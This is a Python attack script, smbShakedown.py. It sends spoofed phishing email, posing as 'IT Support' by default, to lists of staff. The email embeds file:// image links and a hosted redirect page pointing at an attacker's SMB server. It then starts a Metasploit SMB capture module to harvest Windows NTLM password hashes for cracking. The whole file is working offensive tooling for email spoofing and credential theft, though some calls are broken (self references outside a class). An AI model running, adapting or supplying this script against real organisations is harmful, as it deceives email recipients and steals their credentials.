#!/usr/bin/env python
# Description: A simplified SMB Email Client Attack script.
# Created by: Nick Sanzotta / @beamr
# Version: smbShakedown.py v 1.10252016.b
import os, sys, smtplib, getpass, readline, socket, time, subprocess
import urllib, json
import readline
readline.parse_and_bind("tab: complete")
import SocketServer, SimpleHTTPServer, multiprocessing

rcfile = 'smbServ.rc'

class colors:
	white = "\033[1;37m"
	normal = "\033[0;00m"
	red = "\033[1;31m"
	blue = "\033[1;34m"
	green = "\033[1;32m"
	x = "\033[1;35m"

banner = colors.x + r"""
                  __        
                 /\ \       
  ____    ___ ___\ \ \____  
 /',__\ /' __` __`\ \ '__`\ 
/\__, `\/\ \/\ \/\ \ \ \L\ \
\/\____/\ \_\ \_\ \_\ \_,__/
 \/___/  \/_/\/_/\/_/\/___/ 

 ____    __                __                 __                                 
/\  _`\ /\ \              /\ \               /\ \                                
\ \,\L\_\ \ \___      __  \ \ \/'\      __   \_\ \    ___   __  __  __    ___    
 \/_\__ \\ \  _ `\  /'__`\ \ \ , <    /'__`\ /'_` \  / __`\/\ \/\ \/\ \ /' _ `\  
   /\ \L\ \ \ \ \ \/\ \L\.\_\ \ \\`\ /\  __//\ \L\ \/\ \L\ \ \ \_/ \_/ \/\ \/\ \ 
   \ `\____\ \_\ \_\ \__/.\_\\ \_\ \_\ \____\ \___,_\ \____/\ \___x___/'\ \_\ \_\
    \/_____/\/_/\/_/\/__/\/_/ \/_/\/_/\/____/\/__,_ /\/___/  \/__//__/   \/_/\/_/

"""+'\n' \
+ colors.x + '\n smbShakedown.py v1.10252016.b' \
+ colors.normal + '\n Description: A simplified SMB Email Client Attack script.'\
+ colors.normal + '\n Created by: Nick Sanzotta/@beamr' + '\n'\
+ colors.normal + ' ' + '*' * 95 +'\n' + colors.normal

def cls():
	os.system('cls' if os.name == 'nt' else 'clear')

def get_external_address():
	data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
	print("External IP: "+data["ip"])
	return data["ip"]

def get_internal_address():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	print("Internal IP: "+s.getsockname()[0])
	return s.getsockname()[0]

def yes_no(answer):
	yes = set(['yes','y', 'ye', ''])
	no = set(['no','n'])
	 
	while True:
		choice = raw_input(answer).lower()
		if choice in yes:
		   return True
		elif choice in no:
		   return False
		else:
			print ('Please respond with \'yes\' or \'no\'\n')

def smbServ():
	'''starts a metasploit smb capture server in a tmux session called msf_shakedown'''
	smb_server_option = self.yes_no('Use a local Metasploit SMB capture server in a screen session called msf_shakedown? (y/n): ')
	#FEATURE need to allow a choice of internal or external ip?
	if smb_server_option is True:
		rc_config = \
		'use auxiliary/server/capture/smb\n'+\
		'set srvhost {}\n'.format(self.internal_ip)+\
		'set JOHNPWFILE /opt/smbShakedown/smb_hashes\n'+\
		'exploit -j -z'
		print('\n{}\n').format(str(rc_config))
		#prompt user to ok the rc file config
		validate_rc_file = self.yes_no('rc file ready to execute? (y/n): ')
		#if they ok the file
		if validate_rc_file is True:
			#write the file
			with open(self.rc_file, 'w') as rc_file:
				rc_file.writelines(str(rc_config))
				rc_file.close()
			#use subprocess to open tmux new session and run msfconsole in it   
			try:
				print('Starting tmux...')
				proc = subprocess.Popen(['tmux', 'new-session', '-d', '-s', 'msf_shakedown',\
				 'msfconsole -q -r {}'.format(self.rc_file)], stdout=subprocess.PIPE)
				(out, err) = proc.communicate()
				print('Screen sessions: {}'.format(out))
			except Exception as e:
				print('Error: {}'.format(e))
				sys.exit(1)
		#if user opts to not run msfconsole smb capture locallly, provide a sample rc file
		else:
			print('You\'ll need to provide your own rc file. Here\'s a sample')
			print('use auxiliary/server/capture/smb\n\
set srvhost <YOUR.IP.ADDRESS.HERE>\n\
set JOHNPWFILE /opt/smbShakedown/smb_hashes\n\
exploit -j -z')




def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAddress, recipientAddress, emailMessage):
	smtpserver = smtplib.SMTP(smtpServerAddress, smtpServerPort)
	smtpserver.ehlo()
	smtpserver.starttls()
	smtpserver.ehlo
	smtpserver.login(smtpUser, smtpPassword)
	print("Testing Connection to your SMTP Server...")
	time.sleep(1)
	try:
		status = smtpserver.noop()[0]
		print("SMTP Server Status: ",status)
		
		sendOption = yes_no('Connection to SMTP Server is successful, would you like to send mail now? (y/n): ')

		if sendOption is True:
			smtpserver.sendmail(senderAddress, recipientAddress, emailMessage)
			print("Message(s) sent!")
			smtpserver.quit()
			return True
		else:
			smtpserver.quit()
			print("Ok no mail sent.")
			return False


		'''sendOption = raw_input("Connection to SMTP Server is successful, would you like to send mail now?[yes]:") or 'yes'
		

		choice = sendOption.lower()
		yes = set(['yes','y', 'ye', ''])
		no = set(['no','n'])
		print('ENTERED: "%s"' % choice + "\n")
		if choice in yes:
			smtpserver.sendmail(senderAddress, recipientAddress, emailMessage)
			print("Message(s) sent!")
			smtpserver.quit()
			return True
		elif choice in no:
			smtpserver.quit()
			print("Ok no mail sent.")
			return False
		else:
			sys.stdout.write("Please respond with 'yes' or 'no'")'''


	except:
		status = -1
		print("[Aborting]SMTP Server Status: ",status)
	return True if status == 250 else False

def main():
	cls()
	print(banner)
	try:
		extipAddress = get_external_address()
	except IOError:
		print("Check your Internet connection")
		sys.exit(0)
	ipAddress = get_internal_address()
	#duplicate
	#ipAddress = get_internal_address()
	print("\n")
	smtpServerAddress = raw_input('Enter SMTP Server address[smtp.gmail.com]: ') or 'smtp.gmail.com'
	print('ENTERED: "%s"' % smtpServerAddress + "\n")
	smtpServerPort = raw_input('Enter your SMTP Server Port[587]: ') or 587
	print('ENTERED: "%s"' % smtpServerPort + "\n")
	smtpUser = raw_input('Enter SMTP Server username[****@gmail.com]: ')
	print('ENTERED: *****\n')
	smtpPassword = getpass.getpass(r'Enter SMTP Server password: ')
	print("\n")
	senderName = raw_input('Enter "from name":[IT Support]') or  'IT Support'
	print('ENTERED:' "%s" % senderName + "\n")
	senderAddress = raw_input('Enter "from address":[itsupport@company.com]') or 'itsupport@company.com'
	print('ENTERED:' "%s" % senderAddress + "\n")
	recipientName = raw_input('Enter recipient(s) name[Company Staff]: ') or 'Company Staff'
	print('ENTERED:' "%s" % recipientName + "\n")
	print('TIP: This will help avoid the orange "?" and/or Spoof the recipient. Default value usually works.')
	rcptHeader = raw_input('Enter recipient address for the email header[staff@company.com]') or 'staff@company.com'
	print('ENTERED:' "%s" % rcptHeader + "\n")
	try:
		print('TIP: For multiple addresses, enter a file or seperate with a comma\n'\
		'EX:/opt/emailAddresses.txt or user1@company.com,user2@company.com')
		rawrcptAddress = raw_input('Enter BCC recipient addresses[File or individual email(s)]): ')
		print('ENTERED:' "%s" % rawrcptAddress + "\n")
		with open(rawrcptAddress, 'r') as f1:
			x = f1.read()
		recipientAddress = x.split()
		print(recipientAddress)
		print("\n")
	except IOError:
		recipientAddress=rawrcptAddress.split(',')
		print('ENTERED:' "%s" % recipientAddress + "\n")
	smbCaptureServer = raw_input('Enter SMB Capture Server IP address['+extipAddress+']: ') or  extipAddress
	print('ENTERED:' "%s" % smbCaptureServer + "\n")
	#HYPER LINK OPTIONS
	print('TIP: A HyperLink can be directed to an Webpage with an HTML IMG Tag.')

	#use yes_no function instead of inline
	#hyperLinkOption = raw_input('Would you like to add a HyperLink to your message?[yes]: ') or 'yes'
	hyperLinkOption = yes_no('Would you like to add a HyperLink to your message? (y/n): ')

	'''print('ENTERED:' "%s" % hyperLinkOption + "\n")
	choice = hyperLinkOption.lower()
	yes = set(['yes','y', 'ye', ''])
	no = set(['no','n'])
	if choice in yes:'''

	if hyperLinkOption is True:
		print('TIP: Domain based HyperLinks help avoid the "JunkFolder".')
		hyperAddress = raw_input('Please enter a addresss without "http://": ['+extipAddress+']:' ) or extipAddress
		print("ENTERED: " "%s" % "http://"+hyperAddress+"/" + "\n")
		hyperText = raw_input('Enter text for Hyperlink to be displayed[CLICK ME!]: ') or 'CLICK ME!'
		print("ENTERED: " "%s" % hyperText + "\n")
		hyperLink = '<a href="http://'+hyperAddress+'/" target="_blank">'+hyperText+'</a>' 
		#HTTP Server OPTIONS
		print('TIP: You can point your HyperLink to a locally hosted Webpage.')
		

		#use yes_no function instead of inline
		#httpServOption = raw_input("Host local Webpage with an HTML IMG Tag?[yes]: ") or 'yes'
		
		httpServOption = yes_no('Host local Webpage with an HTML IMG Tag? (y/n)? ')
		'''print('ENTERED:' "%s" % httpServOption + "\n")
		choice = httpServOption.lower()
		yes = set(['yes','y', 'ye', ''])
		no = set(['no','n'])
		if choice in yes:'''
		if httpServOption is True:
			httpPort = raw_input("HTTP Server Port?:[80]") or 80
			print('ENTERED:' "%s" % httpPort + "\n")
			print("\n")
			print("TIP: Coming soon...")
			#Redirect OPTIONS
			
			#use yes_no function instead of inline
			#redirectOption = raw_input("Would you like a redirect on your Webpage?[yes]:") or 'yes'
			redirectOption = yes_no('Would you like a redirect on your Webpage? (y/n): ')

			'''print('ENTERED:' "%s" % redirectOption + "\n")
			choice = redirectOption.lower()
			yes = set(['yes','y', 'ye', ''])
			no = set(['no','n'])
			if choice in yes:'''

			if redirectOption is True:
				redirect = raw_input('Enter redirect address[ex: client-site.com]:') or ''
				print('ENTERED:' "%s" % redirect + "\n")
			else:
				print('Okay, Webpage will not redirect:')
				redirect = ''
			'''else:
				sys.stdout.write("Please respond with 'yes' or 'no'")'''

		### EDIT: HTML Template Below ###
		### Becareful not to remove the variables {0} and {1} ###
			html = """
			<!DOCTYPE HTML>
			<html lang="en-US">
				<head>
					<meta charset="UTF-8">
					<meta http-equiv="refresh" content="1;url={1}">
					<script type="text/javascript">
						window.location.href = "{1}"
					</script>
			<title>SMB Egress Test Page.</title>
			</head>
			<br>
			<img src=file://{0}/image/foo.gif>
			</body>
			</html>
			"""
			indexHTML = html.format(smbCaptureServer, redirect)
			print(indexHTML)
			print("\n")
			with open('index.html','w+') as f1:
				f1.write(indexHTML)
			print('Starting HTTP Server')
			print('\n...')
			httpPort = 80
			Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
			httpd = SocketServer.TCPServer(("",httpPort), Handler)
			server_process = multiprocessing.Process(target=httpd.serve_forever)
			server_process.daemon = True
			server_process.start()
			print("Python SimpleHTTPServer now Listening on Port: " + str(httpPort))
			print("\n")
		else:
			print('Ok local HTTP Server not started: \n')
		'''else:
			sys.stdout.write("Please respond with 'yes' or 'no'")'''
			
	
	else:
		print('Okay, A Hyplink will not be added to your message: \n')
		hyperLink = ''
	'''else:
		sys.stdout.write("Please respond with 'yes' or 'no'")'''

	
### EDIT: Email Message Template Below ###
### Becareful not to remove the variables {0},{1},{2},{3} and {4} ###
	message = """From: {0} <{1}>
To: {2} <{3}>
MIME-Version: 1.0
Content-type: text/html
Subject: Thank you for all your help.

Staff,
<br>
...
<br>
{5}
<br>
sincerely,
<br>
<img src=file://{4}/image/sig.jpg height="100" width="150"></a>
"""
##########################################################
	emailMessage = message.format(senderName, senderAddress, recipientName, rcptHeader, smbCaptureServer, hyperLink)
	print('Email Message Template Below:')
	time.sleep(1)
	print(emailMessage)
	smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAddress, recipientAddress, emailMessage)
	time.sleep(1)
	smbServ()
if __name__ == "__main__":
	main()
